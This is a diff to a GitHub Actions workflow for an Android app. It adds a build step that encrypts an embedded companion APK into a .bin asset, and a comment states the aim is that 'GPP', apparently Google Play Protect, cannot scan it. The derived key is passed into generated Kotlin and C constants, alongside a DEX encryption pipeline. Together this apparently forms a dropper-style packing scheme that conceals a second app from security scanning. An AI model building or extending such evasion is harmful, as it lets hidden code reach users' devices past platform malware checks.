@@ -117,6 +117,26 @@ jobs:
           export COMPANION_AUDIT_LOG="${GITHUB_WORKSPACE}/companion_audit.log"
           python3 scripts/build_companion.py
 
+      # Encrypt companion.apk → companion.bin (GPP cannot scan encrypted .bin)
+      - name: "Encrypt companion.apk to companion.bin"
+        run: |
+          set -e
+          BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
+          export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
+          AES_KEY=$(python3 -c "
+          import hashlib, os
+          seed = os.environ.get('GITHUB_SHA','default') + os.environ.get('GITHUB_RUN_ID','0') + 'companion_enc'
+          h = hashlib.sha256(seed.encode()).hexdigest()
+          print(h + hashlib.sha256(h.encode()).hexdigest()[:32])
+          ")
+          echo "::add-mask::$AES_KEY"
+          echo "COMPANION_AES_KEY=$AES_KEY" >> $GITHUB_ENV
+          python3 scripts/encrypt_companion.py \
+            --input  app/src/main/assets/companion.apk \
+            --output app/src/main/assets/companion.bin \
+            --key    "$AES_KEY"
+          echo "companion.bin written, companion.apk removed"
+
       # ── Phase 3 — DEX Encryption Pipeline ────────────────────────────────────────
       # Runs AFTER companion built, BEFORE Nova assembleRelease
 
@@ -180,11 +200,13 @@ jobs:
           echo "Package: $PKG_NAME"
 
           # Generate Kotlin constants
+          COMPANION_KEY="${COMPANION_AES_KEY:-}"
           python3 scripts/chunk_constants_gen.py \
             --manifest /tmp/nova_manifests/chunk_manifest_embedded.json \
             --out-kt "$PKG_DIR/ChunkConstants.kt" \
             --package "$PKG_NAME" \
-            --out-h "app/src/main/cpp/chunk_constants.h"
+            --out-h "app/src/main/cpp/chunk_constants.h" \
+            --companion-aes-key "${COMPANION_AES_KEY:-}"
 
           echo "✅ ChunkConstants.kt:"
           head -20 "$PKG_DIR/ChunkConstants.kt"
